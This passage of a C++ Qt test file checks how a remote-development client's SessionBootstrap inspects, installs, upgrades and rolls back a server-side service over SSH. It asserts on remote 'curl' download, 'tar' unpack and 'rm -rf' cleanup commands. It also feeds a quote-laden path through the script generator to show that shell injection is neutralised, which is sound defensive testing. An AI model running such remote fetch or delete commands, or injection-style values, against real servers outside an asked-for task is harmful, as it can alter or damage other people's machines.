    QCOMPARE(choose(SessionBootstrap::rpcCommand(node, root)).at(0),
             QStringLiteral("[%1][rpc][--stdio]").arg(src));

    // (3) That checkout, built: dist wins over src. It is what package.json bin
    // points at, and it drops the node >= 23.6 requirement.
    const QString built = place(QStringLiteral("remote/dist/codeharbord.js"));
    QCOMPARE(choose(SessionBootstrap::rpcCommand(node, root)).at(0),
             QStringLiteral("[%1][rpc][--stdio]").arg(built));

    // (4) codeharbor-remote.tar.gz unpacked: dist/ beside package.json and
    // sql/. THE RELEASE ARTIFACT — the layout a normal user actually installs.
    const QString release = place(QStringLiteral("dist/codeharbord.js"));
    QCOMPARE(choose(SessionBootstrap::rpcCommand(node, root)).at(0),
             QStringLiteral("[%1][rpc][--stdio]").arg(release));

    const QString bridge = place(QStringLiteral("dist/bridge.js"));
    // The bridge resolves through the same ladder and keeps its stdin watchdog.
    QCOMPARE(choose(SessionBootstrap::bridgeCommand(node, root), true).at(0),
             QStringLiteral("[%1]").arg(bridge));
}

// ---------------------------------------------------------------------------
// PROVISIONING (SessionBootstrap::ensureRemoteService).
//
// Until this existed the remote side had to be installed BY HAND before the
// client could reach a server at all, and getting it wrong produced
// "codeharbord channel closed" — a sentence naming nothing anyone can act on.
// These cases pin the two halves of the fix: install exactly when there is
// nothing usable there, and when it cannot be done, say what to do about it.
// ---------------------------------------------------------------------------

// A server that already has a service is inspected once and otherwise left
// completely alone. This is the common case — every connect after the first —
// so it must cost one round trip and change nothing.
void TstSessionBootstrap::anExistingInstallIsLeftAlone()
{
    Harness h;
    h.boot.setRemoteArtifactUrl(artifactUrl());
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                             installedEntry(), artifactUrl()));
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    QSignalSpy progressSpy(&h.boot, &SessionBootstrap::provisioning);

    QVERIFY(h.wire());
    QCOMPARE(h.boot.state(), State::Wired);
    QCOMPARE(h.boot.scriptsRun.size(), 1); // the report, and nothing else
    QVERIFY(h.boot.scriptsRun.at(0).contains(QStringLiteral("CH_ENTRY=")));
    QVERIFY(progressSpy.isEmpty());
    QVERIFY(errorSpy.isEmpty());
}

// The feature itself: nothing installed, so the client installs it and then
// wires the session it just made possible.
void TstSessionBootstrap::aBareServerIsProvisionedThenWired()
{
    Harness h;
    h.boot.setRemoteArtifactUrl(artifactUrl());
    h.boot.fakeScript(true, inspectionReport());          // 1. nothing there
    h.boot.fakeScript(true, installLog());                // 2. the install
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                             installedEntry(), artifactUrl()));
                                                          // 3. confirmation
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    QSignalSpy progressSpy(&h.boot, &SessionBootstrap::provisioning);
    QSignalSpy stateSpy(&h.boot, &SessionBootstrap::stateChanged);

    QVERIFY(h.wire());
    QCOMPARE(h.boot.state(), State::Wired);
    QVERIFY2(errorSpy.isEmpty(),
             qPrintable(errorSpy.value(0).value(0).toString()));
    QCOMPARE(h.boot.scriptsRun.size(), 3);

    // The middle script really is a download-and-unpack of the artifact THIS
    // client would install, not of "some release".
    const QString install = h.boot.scriptsRun.at(1);
    QVERIFY2(install.contains(artifactUrl()), qPrintable(install));
    QVERIFY2(install.contains(QStringLiteral("curl -fsSL")), qPrintable(install));
    QVERIFY2(install.contains(QStringLiteral("tar -xzf")), qPrintable(install));

    // The user was told it was happening — a first connect that silently spends
    // a minute downloading is indistinguishable from a hung application — and
    // the shell had a state to render while it did.
    QVERIFY2(progressSpy.size() >= 2,
             qPrintable(QStringLiteral("only %1 progress reports")
                            .arg(progressSpy.size())));
    // Provisioning is a detour, not a destination: the attempt goes back to
    // exactly the state it interrupted.
    QCOMPARE(states(stateSpy),
             (QList<State>{State::Connecting, State::Provisioning,
                           State::Connecting, State::Wired}));
}

// A copy WE installed from an older release is replaced. Driving a service from
// a different release than the client is the failure this whole feature could
// otherwise introduce, so it is neither ignored nor merely reported.
void TstSessionBootstrap::aStaleInstallOfOursIsReplaced()
{
    Harness h;
    h.boot.setRemoteArtifactUrl(artifactUrl());
    h.boot.fakeScript(
        true,
        inspectionReport(
            QStringLiteral("v24.16.0"), installedEntry(),
            QStringLiteral("https://example.invalid/v8/codeharbor-remote.tar.gz")));
    h.boot.fakeScript(true, installLog());
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                             installedEntry(), artifactUrl()));
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY(h.wire());
    QCOMPARE(h.boot.scriptsRun.size(), 3);
    QVERIFY2(h.boot.scriptsRun.at(1).contains(artifactUrl()),
             qPrintable(h.boot.scriptsRun.at(1)));
    QVERIFY(errorSpy.isEmpty());
}

// The other side of that coin, and the one that would hurt: a directory a
// PERSON manages (a git checkout, a hand-unpacked tarball) has no release
// marker, and is never written over. Someone else's tree is not ours to
// replace, and an incompatible one is still caught by AppController's
// kMinimumServerSchemaVersion check against server.info.
void TstSessionBootstrap::anInstallWeDidNotMakeIsNeverOverwritten()
{
    Harness h;
    h.boot.setRemoteArtifactUrl(artifactUrl());
    h.boot.fakeScript(
        true, inspectionReport(
                  QStringLiteral("v24.16.0"),
                  QStringLiteral("/srv/codeharbor/remote/src/codeharbord.ts")));
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY(h.wire());
    QCOMPARE(h.boot.scriptsRun.size(), 1);
    QVERIFY(errorSpy.isEmpty());
}

// Node is a prerequisite this client cannot install. Missing, it is named — the
// path that is wrong, the version to install, and the host — instead of
// surfacing three steps later as a dead channel.
void TstSessionBootstrap::missingRemoteNodeFailsWithSomethingToActOn()
{
    Harness h;
    h.boot.fakeScript(true, inspectionReport(QString(), installedEntry()));
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY(!h.wire());
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(errorSpy.size(), 1);
    const QString message = errorSpy.at(0).at(0).toString();
    QVERIFY2(message.contains(QStringLiteral("/usr/bin/node")), qPrintable(message));
    QVERIFY2(message.contains(QStringLiteral("23.6")), qPrintable(message));
    QVERIFY2(message.contains(h.host), qPrintable(message));
    // Nothing was launched and nothing was installed.
    QCOMPARE(h.boot.scriptsRun.size(), 1);
    QVERIFY(h.boot.rpcDevice() == nullptr);
}

void TstSessionBootstrap::tooOldRemoteNodeBlocksProvisioningButNotAnExistingInstall()
{
    { // Something is already installed: an old node is a warning, not a wall.
      // entryCandidates() prefers built dist/*.js, which node 22 runs fine, so
      // a server that works today has to keep working.
        Harness h;
        h.boot.fakeScript(true, inspectionReport(QStringLiteral("v22.11.0"),
                                                 installedEntry()));
        QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
        QSignalSpy diagSpy(&h.boot, &SessionBootstrap::channelDiagnostic);

        QVERIFY(h.wire());
        QCOMPARE(h.boot.state(), State::Wired);
        QVERIFY(errorSpy.isEmpty());
        QCOMPARE(diagSpy.size(), 1);
        QVERIFY2(diagSpy.at(0).at(1).toString().contains(QStringLiteral("22.11.0")),
                 qPrintable(diagSpy.at(0).at(1).toString()));
    }
    { // Nothing installed: installing onto a node that cannot run the result
      // only moves the failure later, so it is refused now, by name.
        Harness h;
        h.boot.setRemoteArtifactUrl(artifactUrl());
        h.boot.fakeScript(true, inspectionReport(QStringLiteral("v22.11.0")));
        QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

        QVERIFY(!h.wire());
        QCOMPARE(errorSpy.size(), 1);
        const QString message = errorSpy.at(0).at(0).toString();
        QVERIFY2(message.contains(QStringLiteral("23.6")), qPrintable(message));
        QVERIFY2(message.contains(QStringLiteral("22.11.0")), qPrintable(message));
        // Refused BEFORE anything was written to somebody else's machine.
        QCOMPARE(h.boot.scriptsRun.size(), 1);
    }
}

// The cost of having the SERVER download the release: it needs a download tool.
// When it has none, the message names both tools, the directory, and the way
// out that needs no network at all.
void TstSessionBootstrap::noRemoteDownloadToolFailsWithSomethingToActOn()
{
    Harness h;
    h.boot.setRemoteArtifactUrl(artifactUrl());
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"), QString(),
                                             QString(), QStringLiteral("none")));
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY(!h.wire());
    QCOMPARE(errorSpy.size(), 1);
    const QString message = errorSpy.at(0).at(0).toString();
    QVERIFY2(message.contains(QStringLiteral("curl")), qPrintable(message));
    QVERIFY2(message.contains(QStringLiteral("wget")), qPrintable(message));
    QVERIFY2(message.contains(QStringLiteral("CH_REMOTE_ARTIFACT_URL")),
             qPrintable(message));
    QCOMPARE(h.boot.scriptsRun.size(), 1);
}

// ...and that way out works: a tarball already staged on the server is copied,
// so an air-gapped machine with neither curl nor wget still provisions.
void TstSessionBootstrap::aStagedTarballNeedsNoDownloadTool()
{
    Harness h;
    const QString staged = QStringLiteral("/srv/stage/codeharbor-remote.tar.gz");
    h.boot.setRemoteArtifactUrl(staged);
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"), QString(),
                                             QString(), QStringLiteral("none")));
    h.boot.fakeScript(true, installLog());
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                             installedEntry(), staged));
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY(h.wire());
    QVERIFY2(errorSpy.isEmpty(),
             qPrintable(errorSpy.value(0).value(0).toString()));
    const QString install = h.boot.scriptsRun.at(1);
    QVERIFY2(install.contains(QStringLiteral("cp '") + staged + QLatin1Char('\'')),
             qPrintable(install));
    QVERIFY2(!install.contains(QStringLiteral("curl")), qPrintable(install));
    QVERIFY2(!install.contains(QStringLiteral("wget")), qPrintable(install));
}

// An install that reports success but leaves nothing behind must fail HERE. The
// alternative is believing it and handing the user "codeharbord channel closed"
// a moment later, which is the exact failure this feature exists to remove.
void TstSessionBootstrap::anInstallThatDidNotLandFailsLoudly()
{
    Harness h;
    h.boot.setRemoteArtifactUrl(artifactUrl());
    h.boot.fakeScript(true, inspectionReport());
    h.boot.fakeScript(true, installLog());
    // The confirming re-inspection still finds no entry point.
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0")));
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY(!h.wire());
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY2(errorSpy.at(0).at(0).toString().contains(
                 QStringLiteral("no codeharbord entry point")),
             qPrintable(errorSpy.at(0).at(0).toString()));
    QVERIFY(h.boot.rpcDevice() == nullptr);
}

// The inspection is a DIAGNOSTIC, and a failed diagnostic is not a failed
// connect. Refusing here would turn every server whose sh, channel limit or
// login banner defeats the report into an unreachable one, including servers
// that worked before this code existed.
void TstSessionBootstrap::anInspectionThatCannotRunStillConnects()
{
    Harness h;
    h.boot.fakeScript(false, QString(),
                      QStringLiteral("could not open an SSH channel"));
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    QSignalSpy diagSpy(&h.boot, &SessionBootstrap::channelDiagnostic);

    QVERIFY(h.wire());
    QCOMPARE(h.boot.state(), State::Wired);
    QVERIFY(errorSpy.isEmpty());
    QCOMPARE(diagSpy.size(), 1);
    QVERIFY2(diagSpy.at(0).at(1).toString().contains(
                 QStringLiteral("without provisioning")),
             qPrintable(diagSpy.at(0).at(1).toString()));
    QCOMPARE(h.boot.scriptsRun.size(), 1);
}

// remote/package.json declares "engines": { "node": ">=23.6" }, and 23.6 is the
// first Node that runs TypeScript directly. The comparison has to be a version
// comparison, not a string one.
void TstSessionBootstrap::nodeVersionFloorMatchesTheRemotePackageEngine()
{
    QVERIFY(!SessionBootstrap::nodeVersionIsSupported(QString()));
    QVERIFY(!SessionBootstrap::nodeVersionIsSupported(QStringLiteral("v22.11.0")));
    QVERIFY(!SessionBootstrap::nodeVersionIsSupported(QStringLiteral("v23.5.9")));
    QVERIFY(!SessionBootstrap::nodeVersionIsSupported(QStringLiteral("23")));
    QVERIFY(!SessionBootstrap::nodeVersionIsSupported(QStringLiteral("banana")));
    QVERIFY(SessionBootstrap::nodeVersionIsSupported(QStringLiteral("v23.6.0")));
    QVERIFY(SessionBootstrap::nodeVersionIsSupported(QStringLiteral("23.6")));
    QVERIFY(SessionBootstrap::nodeVersionIsSupported(QStringLiteral("v24.16.0")));
    // A string comparison would call 30 older than 4.
    QVERIFY(SessionBootstrap::nodeVersionIsSupported(QStringLiteral("v30.0.0")));
}

// A profile may legitimately carry a blank nodePath (ServerProfiles says the
// field "may be filled in later"), and a blank one used to be spliced straight
// into `command -v ''`, which fails and reports the SERVER as having no Node -
// naming neither the field nor the fix. The mobile connect form now requires
// the value, so this is the guard behind it: an already-saved blank profile
// probes a bare `node` instead of the empty string, and the prerequisite report
// then names something a user can act on.
//
// Note this is a FALLBACK, not a lookup policy: README documents an absolute
// path precisely because a non-interactive SSH session often has a shorter PATH.
void TstSessionBootstrap::aBlankNodePathFallsBackToABareName()
{
    QCOMPARE(SessionBootstrap::resolveNodePath(QString()),
             QStringLiteral("node"));
    QCOMPARE(SessionBootstrap::resolveNodePath(QStringLiteral("   ")),
             QStringLiteral("node"));
    QCOMPARE(SessionBootstrap::resolveNodePath(QStringLiteral("\t\n")),
             QStringLiteral("node"));

    // A supplied value is returned untouched - including one whose own spacing
    // is wrong. Rewriting a remote path is not this function's business, and a
    // silent trim would make a typo unreportable.
    QCOMPARE(SessionBootstrap::resolveNodePath(QStringLiteral("/usr/bin/node")),
             QStringLiteral("/usr/bin/node"));
    QCOMPARE(SessionBootstrap::resolveNodePath(QStringLiteral("node")),
             QStringLiteral("node"));
    QCOMPARE(
        SessionBootstrap::resolveNodePath(QStringLiteral("/opt/node 22/bin/node")),
        QStringLiteral("/opt/node 22/bin/node"));
    QCOMPARE(SessionBootstrap::resolveNodePath(QStringLiteral(" /usr/bin/node ")),
             QStringLiteral(" /usr/bin/node "));
}

// "Versions must match" without a second version constant to keep in sync: the
// URL the client installs FROM carries the client's own version.
void TstSessionBootstrap::theInstalledReleaseIsTiedToTheClientVersion()
{
    if (!qEnvironmentVariableIsEmpty("CH_REMOTE_ARTIFACT_URL"))
        QSKIP("CH_REMOTE_ARTIFACT_URL is set; it overrides the default URL");

    const QString saved = QCoreApplication::applicationVersion();
    const auto restore = qScopeGuard(
        [saved] { QCoreApplication::setApplicationVersion(saved); });

    QCoreApplication::setApplicationVersion(QStringLiteral("9.9.9"));
    const QString url = SessionBootstrap::defaultRemoteArtifactUrl();
    QVERIFY2(url.contains(QStringLiteral("/v9.9.9/")), qPrintable(url));
    QVERIFY2(url.endsWith(QStringLiteral("/codeharbor-remote.tar.gz")),
             qPrintable(url));

    // A host that does not know its own version must not GUESS a release: it
    // says so, and the failure message tells the user what to do instead.
    QCoreApplication::setApplicationVersion(QString());
    QVERIFY(SessionBootstrap::defaultRemoteArtifactUrl().isEmpty());
}

// Provisioning writes to somebody else's machine, so two properties are
// non-negotiable: every interpolated path is quoted, and nothing is created
// outside the directory the user chose. The root here carries both a space and
// a single quote.
void TstSessionBootstrap::provisioningStaysInsideTheChosenDirectory()
{
    const QString root = QStringLiteral("/srv/co de'harbor");
    const QString script = SessionBootstrap::remoteProvisionScript(
        root, QStringLiteral("https://example.invalid/a.tar.gz"),
        QStringLiteral("curl"));

    // The hostile root is quoted, so its embedded quote cannot end the argument
    // and start a command of the attacker's choosing.
    QVERIFY2(script.contains(QStringLiteral("mkdir -p '/srv/co de'\\''harbor'")),
             qPrintable(script));
    // Scratch space and the release marker both live UNDER that root.
    QVERIFY2(script.contains(
                 QStringLiteral("'/srv/co de'\\''harbor/.codeharbor-provision'")),
             qPrintable(script));
    QVERIFY2(script.contains(
                 QStringLiteral("'/srv/co de'\\''harbor/.codeharbor-release'")),
             qPrintable(script));
    // Nothing is put in a shared temporary directory.
    QVERIFY2(!script.contains(QStringLiteral("/tmp")), qPrintable(script));
    // The archive is unpacked into the STAGING directory, never over the live
    // installation: until the swap below, every path the running service uses
    // is still the one it was launched from.
    QVERIFY2(script.contains(QStringLiteral(
                 "tar -xzf '/srv/co de'\\''harbor/.codeharbor-provision/"
                 "codeharbor-remote.tar.gz' -C '/srv/co de'\\''harbor/"
                 ".codeharbor-provision/stage'")),
             qPrintable(script));
    // The rollback is armed before the first byte is fetched, so every failure
    // from there on puts the previous installation back...
    const qsizetype armed = script.indexOf(QStringLiteral("trap ch_restore EXIT"));
    QVERIFY(armed >= 0);
    QVERIFY(armed < script.indexOf(QStringLiteral("curl -fsSL")));
    // ...out of the backup the swap displaced it into, and back under the root.
    QVERIFY2(script.contains(QStringLiteral(
                 "mv '/srv/co de'\\''harbor/.codeharbor-provision/backup'/"
                 "\"$__ch_b\" '/srv/co de'\\''harbor'/\"$__ch_b\"")),
             qPrintable(script));
    // The marker is WRITTEN only after the staged tree has been proven to hold
    // an entry point, so an install that died halfway is retried instead of
    // being mistaken for a current one.
    const qsizetype markerWrite =
        script.indexOf(QStringLiteral("> '/srv/co de'\\''harbor/"
                                      ".codeharbor-release'"));
    QVERIFY(markerWrite >= 0);
    const qsizetype verdict =
        script.indexOf(QStringLiteral("not a codeharbor-remote release"));
    QVERIFY(verdict >= 0);
    QVERIFY(script.indexOf(QStringLiteral("tar -xzf")) < verdict);
    QVERIFY(verdict < markerWrite);

    // EVERY cleanup revokes the undo's authorisation before it starts deleting.
    // `rm -f <ready>` is one unlink; `rm -rf <scratch>` is a recursive walk a
    // kill can stop halfway, and the sentinel left standing over a half-deleted
    // backup is the one state that would make the NEXT undo delete a live
    // installation: every planned member would look like one this install had
    // brought in with no predecessor, which is the case that deletes.
    const QString revoke =
        QStringLiteral("rm -f '/srv/co de'\\''harbor/.codeharbor-provision/ready'");
    const QString sweep =
        QStringLiteral("rm -rf '/srv/co de'\\''harbor/.codeharbor-provision'");
    // Exactly one sweep is allowed to stand alone: the fresh-start wipe, which is
    // identified by what FOLLOWS it — it is the one that goes on to create the
    // staging tree. Identifying it by position instead would pick the wrong one,
    // because ch_undo() is DEFINED before that wipe and its guarded sweep is
    // therefore the first in the text. Standing alone is correct there: no
    // sentinel of this run exists yet, and a kill inside it leaves a scratch no
    // undo will ever act on.
    const QString create =
        QStringLiteral("; mkdir -p '/srv/co de'\\''harbor/.codeharbor-provision/"
                       "stage' '/srv/co de'\\''harbor/.codeharbor-provision/"
                       "backup'");
    int guarded = 0;
    int exempt = 0;
    for (qsizetype at = script.indexOf(sweep); at >= 0;
         at = script.indexOf(sweep, at + 1)) {
        if (script.mid(at + sweep.size(), create.size()) == create) {
            ++exempt;
            continue;
        }
        const QString before = script.mid(at - revoke.size() - 2, revoke.size() + 2);
        QVERIFY2(before == revoke + QStringLiteral("; "),
                 qPrintable(QStringLiteral("a scratch cleanup is not preceded by "
                                           "revoking the sentinel; found \"%1\"")
                                .arg(before)));
        ++guarded;
    }
    // ch_undo's tail and the commit point. A drop to one means a cleanup lost its
    // guard rather than the loop having had nothing to check.
    QCOMPARE(guarded, 2);
    QCOMPARE(exempt, 1);

    // Same rule for the inspection, which interpolates the node path too.
    const QString inspect = SessionBootstrap::remoteInspectScript(
        QStringLiteral("/opt/no de/bin/node"), root);
    QVERIFY2(inspect.contains(QStringLiteral("command -v '/opt/no de/bin/node'")),
             qPrintable(inspect));
    QVERIFY2(inspect.contains(
                 QStringLiteral("'/srv/co de'\\''harbor/.codeharbor-release'")),
             qPrintable(inspect));
    // A report, never a write: the inspection must not be able to change the
    // server it is describing.
    QVERIFY2(!inspect.contains(QStringLiteral("mkdir")), qPrintable(inspect));
    QVERIFY2(!inspect.contains(QStringLiteral("rm ")), qPrintable(inspect));
    QVERIFY2(!inspect.contains(QStringLiteral("printf")), qPrintable(inspect));
}

void TstSessionBootstrap::theReportIsReadBackFieldForField()
{
    const SessionBootstrap::RemoteInspection info =
        SessionBootstrap::parseInspection(
            // A login banner ahead of the report is normal and must be ignored.
            QStringLiteral("Welcome to the fixture!\n"
                           "CH_NODE=v24.16.0\n"
                           "CH_ENTRY=/srv/codeharbor/dist/codeharbord.js\n"
                           "CH_MARKER=https://example.invalid/a.tar.gz\n"
                           "CH_FETCH=wget\n"
                           "CH_TAR=yes\n"));
    QVERIFY(info.reported);
    QVERIFY(info.nodePresent);
    QCOMPARE(info.nodeVersion, QStringLiteral("v24.16.0"));
    QCOMPARE(info.entry, QStringLiteral("/srv/codeharbor/dist/codeharbord.js"));
    QCOMPARE(info.marker, QStringLiteral("https://example.invalid/a.tar.gz"));
    QCOMPARE(info.fetcher, QStringLiteral("wget"));
    QVERIFY(info.tar);

    const SessionBootstrap::RemoteInspection empty =
        SessionBootstrap::parseInspection(
            QStringLiteral("CH_NODE=v24.16.0\nCH_ENTRY=\nCH_MARKER=\n"
                           "CH_FETCH=none\nCH_TAR=no\n"));
    QVERIFY(empty.reported);
    QVERIFY(empty.nodePresent);
    QVERIFY(empty.entry.isEmpty());
    QVERIFY(empty.marker.isEmpty());
    QVERIFY(!empty.tar);

    // No report at all reads as "cannot tell", never as "everything is
    // missing" — the difference between connecting anyway and refusing.
    QVERIFY(!SessionBootstrap::parseInspection(
                 QStringLiteral("sh: syntax error near unexpected token"))
                 .reported);

    // A staged tarball is recognised in both spellings; a network URL is not.
    QCOMPARE(SessionBootstrap::stagedArtifactPath(QStringLiteral("/srv/a.tar.gz")),
             QStringLiteral("/srv/a.tar.gz"));
    QCOMPARE(
        SessionBootstrap::stagedArtifactPath(QStringLiteral("file:///srv/a.tar.gz")),
        QStringLiteral("/srv/a.tar.gz"));
    QVERIFY(SessionBootstrap::stagedArtifactPath(
                QStringLiteral("https://example.invalid/a.tar.gz"))
                .isEmpty());
}

// The upgrade the USER asked for is the one case that replaces an installation
// this client did not create: a hand-unpacked release tarball, which is exactly
// what README.md tells people to make. Without this, following the documented
// install left a server that could never be updated from the client.
void TstSessionBootstrap::aRequestedUpgradeReplacesAnInstallWeDidNotMake()
{
    Harness h;
    h.boot.setRemoteArtifactUrl(artifactUrl());
    // A working install in the RELEASE layout with no marker: nobody's connect
    // would touch it (anInstallWeDidNotMakeIsNeverOverwritten pins that).
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                             installedEntry()));
    h.boot.fakeScript(true, installLog());
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                             installedEntry(), artifactUrl()));
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    QSignalSpy progressSpy(&h.boot, &SessionBootstrap::provisioning);

    h.boot.requestRemoteUpgrade();
    QVERIFY(h.boot.remoteUpgradeRequested());
    QVERIFY(h.wire());

    QVERIFY2(errorSpy.isEmpty(),
             qPrintable(errorSpy.value(0).value(0).toString()));
    // Inspect, install, verify — the install really ran, against this client's
    // own release URL.
    QCOMPARE(h.boot.scriptsRun.size(), 3);
    QVERIFY2(h.boot.scriptsRun.at(1).contains(artifactUrl()),
             qPrintable(h.boot.scriptsRun.at(1)));
    // The user is told this is an UPDATE, not a first install: something was
    // already there and saying "Installing" about a replacement is a lie the
    // progress line is the only place to catch.
    QVERIFY(!progressSpy.isEmpty());
    QVERIFY2(progressSpy.at(0).at(0).toString().contains(
                 QStringLiteral("Updating")),
             qPrintable(progressSpy.at(0).at(0).toString()));
}

// ...and the one place it stops. A service running out of a source checkout is
// not replaced: unpacking a release beside it would leave the checkout in place
// but no longer running, inside a directory its owner maintains.
//
// Refusing the INSTALL is not refusing the session. Nothing was written, so the
// checkout is still there and still runnable, and dropping the connect as well
// would answer a mistaken click by taking the user's workspace away until they
// undid something the client never did.
void TstSessionBootstrap::aRequestedUpgradeRefusesASourceCheckoutAndKeepsUsingIt()
{
    Harness h;
    h.boot.setRemoteArtifactUrl(artifactUrl());
    const QString checkout =
        QStringLiteral("/srv/codeharbor/remote/src/codeharbord.ts");
    h.boot.fakeScript(true,
                      inspectionReport(QStringLiteral("v24.16.0"), checkout));
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    QSignalSpy upgradeSpy(&h.boot, &SessionBootstrap::upgradeFailed);

    h.boot.requestRemoteUpgrade();
    QVERIFY(h.wire());
    QCOMPARE(h.boot.state(), State::Wired);
    QVERIFY(h.boot.rpcDevice() != nullptr);
    // The user asked for the upgrade, so the refusal reaches them through the
    // one signal a successful connect does not swallow.
    QVERIFY(errorSpy.isEmpty());
    QCOMPARE(upgradeSpy.size(), 1);
    const QString message = upgradeSpy.at(0).at(0).toString();
    QVERIFY2(message.contains(checkout), qPrintable(message));
    QVERIFY2(message.contains(QStringLiteral("Nothing was changed")),
             qPrintable(message));
    // ...and it names what is still running, because that is what the session
    // the user is now looking at is talking to.
    QVERIFY2(message.contains(QStringLiteral("left exactly as it was")),
             qPrintable(message));
    // Refused after the inspection and before anything was written.
    QCOMPARE(h.boot.scriptsRun.size(), 1);
}

// The request is spent by the attempt it was made for. A flag that survived
// would turn every later reconnect — including each rung of the automatic
// ladder — into a fresh download and unpack of the same release.
void TstSessionBootstrap::aRequestedUpgradeAppliesToOneAttemptOnly()
{
    Harness h;
    h.boot.setRemoteArtifactUrl(artifactUrl());
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                             installedEntry()));
    h.boot.fakeScript(true, installLog());
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                             installedEntry(), artifactUrl()));
    h.boot.requestRemoteUpgrade();
    QVERIFY(h.wire());
    QVERIFY(!h.boot.remoteUpgradeRequested());
    QCOMPARE(h.boot.scriptsRun.size(), 3);

    // Second attempt, nothing requested: the marker now matches, so the only
    // remote command is the inspection.
    h.boot.disconnectSession();
    h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                             installedEntry(), artifactUrl()));
    QVERIFY(h.wire());
    QCOMPARE(h.boot.scriptsRun.size(), 4);
}

// A connect whose inspection cannot run carries on silently, by design. An
// UPGRADE that cannot run must not: the user asked for a change to their
// server, and nothing was written.
void TstSessionBootstrap::aRequestedUpgradeThatCannotInspectSaysSo()
{
    Harness h;
    h.boot.setRemoteArtifactUrl(artifactUrl());
    h.boot.fakeScript(false, QString(), QStringLiteral("channel refused"));
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    QSignalSpy upgradeSpy(&h.boot, &SessionBootstrap::upgradeFailed);

    h.boot.requestRemoteUpgrade();
    // Still connects: the installation that is already there may work fine.
    QVERIFY(h.wire());
    QCOMPARE(h.boot.state(), State::Wired);
    // NOT error(): AppController holds error() for the duration of a connect
    // attempt and drops it when the attempt succeeds, which this one does, so
    // routing it there would show the user nothing at all.
    QVERIFY(errorSpy.isEmpty());
    QCOMPARE(upgradeSpy.size(), 1);
    const QString message = upgradeSpy.at(0).at(0).toString();
    QVERIFY2(message.contains(QStringLiteral("channel refused")),
             qPrintable(message));
    QVERIFY2(message.contains(QStringLiteral("Nothing was changed")),
             qPrintable(message));
    QVERIFY(!h.boot.remoteUpgradeRequested());
    QCOMPARE(h.boot.scriptsRun.size(), 1);
}

// requestRemoteUpgrade() arms exactly ONE attempt, and the attempt that spends
// it is pinned by aRequestedUpgradeAppliesToOneAttemptOnly(). This is the other
// half: the two ways the request can be taken back before it is ever spent.
//
// Both matter because an upgrade DOWNLOADS AND UNPACKS over somebody's server.
// A flag that outlived the intent behind it would do that on a connect the user
// never asked it for - and, on the reconnect ladder, on every rung.
void TstSessionBootstrap::anArmedUpgradeIsSpentOrWithdrawnNeverForgotten()
{
    { // cancelRemoteUpgrade(): the user changed their mind before connecting.
        Harness h;
        h.boot.setRemoteArtifactUrl(artifactUrl());
        h.boot.requestRemoteUpgrade();
        QVERIFY(h.boot.remoteUpgradeRequested());
        h.boot.cancelRemoteUpgrade();
        QVERIFY(!h.boot.remoteUpgradeRequested());

        // So the connect that follows is an ORDINARY one: an installation with
        // no release marker belongs to a person and is left alone, and the only
        // remote command is the prerequisite report.
        h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                                 installedEntry()));
        QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
        QSignalSpy progressSpy(&h.boot, &SessionBootstrap::provisioning);
        QVERIFY(h.wire());
        QCOMPARE(h.boot.scriptsRun.size(), 1);
        QVERIFY(progressSpy.isEmpty());
        QVERIFY(errorSpy.isEmpty());
    }
    { // disconnectSession(): the user gave up on the connect it was made for.
      // A request survives a FAILED attempt on purpose (the retry is still
      // their upgrade), but an explicit teardown is not a retry.
        Harness h;
        h.boot.setRemoteArtifactUrl(artifactUrl());
        h.boot.requestRemoteUpgrade();
        h.boot.disconnectSession();
        QVERIFY(!h.boot.remoteUpgradeRequested());

        h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                                 installedEntry()));
        QSignalSpy progressSpy(&h.boot, &SessionBootstrap::provisioning);
        QVERIFY(h.wire());
        QCOMPARE(h.boot.state(), State::Wired);
        QVERIFY2(progressSpy.isEmpty(),
                 qPrintable(QStringLiteral("a withdrawn upgrade still wrote to "
                                           "the server: %1")
                                .arg(progressSpy.value(0).value(0).toString())));
        QCOMPARE(h.boot.scriptsRun.size(), 1);
    }
}

// The bug this pair exists for, in the reporter's words: an update failed
// because the server's Node was too old, and after that the remote service
// could not be used AT ALL until Node had been upgraded there. Two independent
// defects produced that, and both are pinned here.
//
// Defect one: a prerequisite of INSTALLING ended the connect. A client upgrade
// alone is enough to reach the install path — the release marker then names a
// tarball this client would no longer install — so a server that had been
// working for months became unreachable the moment the desktop was updated,
// with the only way out being a change on the server.
void TstSessionBootstrap::anUpdateBlockedByAPrerequisiteKeepsTheOldServiceUsable()
{
    { // The ordinary connect that decided to update: the marker is ours and
